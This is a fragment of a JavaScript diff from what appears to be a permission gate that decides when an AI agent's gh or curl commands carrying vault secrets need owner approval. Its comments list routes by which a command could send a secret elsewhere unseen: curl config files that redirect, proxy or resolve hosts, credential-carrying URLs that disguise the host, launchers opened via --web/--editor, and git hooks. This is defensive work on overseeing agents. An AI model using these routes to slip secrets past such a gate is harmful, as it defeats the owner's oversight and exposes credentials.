     if (row.blindSubs && row.blindSubs.some((b) => b.every((w, i) => sub[i] === w))) { unread = true; gitDriven = true; }   // round 2b: a subcommand that drives git (gh repo clone / pr checkout) — the project's config / hooks decide where it goes
     if (row.blindFlagSubs) for (const b of row.blindFlagSubs) if (b.sub.every((w, i) => sub[i] === w) && boolFlagOn(argv, b.longs || [], b.shorts || [], vg)) { unread = true; gitDriven = true; }   // round 3/4/5: a verb that drives git only with a bool flag (gh pr merge --delete-branch/-d, repo create --push/--clone/-c) — boolFlagOn matches every pflag spelling (long, =true not =false, a short alone or in a cluster, -x=true); round 5: a cluster's =value binds to the LAST letter only (the grammar says which letters take a value)
     if (vg && vg.launch && boolFlagOn(argv, vg.launch.filter((f) => f.startsWith('--')), vg.launch.filter((f) => /^-[A-Za-z]$/.test(f)), vg)) unread = true;   // round 10 (BLOCKER 1a): an allowlisted verb with --web/-w or --editor/-e opens a launcher gh resolves from its config file's browser:/editor: key or exec.LookPath on the child's PATH, with the minted value in that program's env — BLIND (the card asks); the launch set is GENERATED per verb from the help and help-hash pinned
@@ -762,9 +828,9 @@ function shapeOf(run) {
   const known = !!row && kind === 'tool';   // round 2: `unread` (a curl glob, a bare number) is part of an UNKNOWN destination — never «always»
   const cfgVals = row && kind === 'tool' && row.configFlags ? valued.filter(([f]) => row.configFlags.includes(f)).map(([, v]) => v) : [];   // round 17 (item 1): the config-flag values (curl -K / --config …)
   const configShown = configFile && !configOpaque && cfgVals.length > 0 && cfgVals.every((v) => configTemplateShown(v, run));   // every config value is a $VAULT_FILE template the card renders IN FULL ⇒ the owner sees the agent's ONLY written input ⇒ «always» may be offered (keyed on the template bytes, already in the shape key)
-  let configReads = null;   // round 18 (item 3): a shown config template that NESTS another agent-writable file ⇒ «always» withheld (the card names the directive)
-  if (configShown && row) for (const v of cfgVals) { const mm = /^\$VAULT_FILE\{([^}]*)\}$/.exec(String(v)); const file = mm && run.files.find((x) => x.name === mm[1]); if (file && file.template != null && typeof file.text === 'string') { const d = configNestedFile(file.text, row); if (d) { configReads = d; break; } } }
-  const userinfo = !!(row && kind === 'tool') && [...argv.slice(1), ...run.plainEnv.map((e) => e.value)].some(urlUserinfo);   // round 18 (item 1): a credential-carrying http(s) URL in a known tool's command ⇒ the door refuses url_userinfo (a URL whose userinfo can disguise the host is never a route)
+  let configReads = null;   // round 18/19 (item 3/4): a shown config template whose directives READ a file, ROUTE off the URL's host (url/connect-to/resolve/proxy, scheme-less included), REDIRECT (location/proto-redir) or EXPAND a {{var}} host ⇒ «always» withheld + named; the route hosts it names join the Hosts line, a {{var}} is never a host (blind)
+  if (configShown && row) for (const v of cfgVals) { const mm = /^\$VAULT_FILE\{([^}]*)\}$/.exec(String(v)); const file = mm && run.files.find((x) => x.name === mm[1]); if (file && file.template != null && typeof file.text === 'string') { const d = configNestedFile(file.text, row); if (d.reads && !configReads) configReads = d.reads; for (const h of d.hosts) { hosts.add(h); if (!row.freeText) routeHosts.add(h); } if (d.blind) unread = true; } }
+  const userinfo = !!(row && kind === 'tool') && routeWords.some(urlUserinfo);   // round 18/19 (item 1 + MINOR): a credential-carrying http(s) URL in a ROUTE word (a -R/--repo/--hostname/GH_HOST/GH_REPO value, a repo spec, a gh api/<url> positional, a curl target) ⇒ url_userinfo; judged on route words ONLY — a userinfo URL quoted in a --body / -d body is a mention, never contacted, never refused
   const bigTpl = run.files.find((f) => f.template != null && typeof f.text === 'string' && bytesOf(f.text) > TEMPLATE_CARD_MAX);   // round 18 (item 2): ANY template (a config flag, a body, a positional, a -d value) past the card render bound ⇒ card_too_long — ONE verdict, never a note that hides it
   const cardTooLong = bigTpl ? { name: bigTpl.name, template: bigTpl.template, bytes: bytesOf(bigTpl.text) } : null;
   const noAlways = kind !== 'tool' ? kind : !known || !hosts.size || unread ? 'unknown-destination' : row.runsProject ? 'runs-project-code' : configFile && !(configShown && !configReads) ? 'config-file' : run.programWritable ? 'program-writable' : null;
@@ -1196,7 +1262,7 @@ function createMasker(secrets) {
 function maskText(text, secrets) { const m = createMasker(secrets); return m.push(text) + m.end(); }
 
 module.exports = {
-  SCHEME, MIN_MASK_BYTES, CMD_MAX, TEMPLATE_MAX, TEMPLATE_CARD_MAX, TIMEOUT_DEFAULT_S, TIMEOUT_MAX_S, OUTPUT_MAX_BYTES, ASK_TTL_MS, ALWAYS_TTLS, ALWAYS_DEFAULT, SHAPE_V, SHAPE_NOTE, WORDS, refusalOf,
+  SCHEME, MIN_MASK_BYTES, CMD_MAX, TEMPLATE_MAX, TEMPLATE_CARD_MAX, urlHostsBad, parseCfgLine, cfgRouteHosts, repoHostOf, TIMEOUT_DEFAULT_S, TIMEOUT_MAX_S, OUTPUT_MAX_BYTES, ASK_TTL_MS, ALWAYS_TTLS, ALWAYS_DEFAULT, SHAPE_V, SHAPE_NOTE, WORDS, refusalOf,
   parseRef, scanRefs, renderTemplate, placeholderOf, agentScopeOf, ownsAgentEntry, forHostOf, sameHost, ghCredEnvFor, isFreeEntry, refFor: refOf,
   INJECTIONS, injectionOf, ENV_HIJACK, ENV_CONFIG, envRefusedOf,
   TOOL_ROWS, SHELLS, INTERPRETERS, KNOWN_TOOLS, toolNameOf, knownToolOf, refusedTool, toolKindOf, targetOf, conninfoHosts, urlHosts, urlParse, configNestedFile,
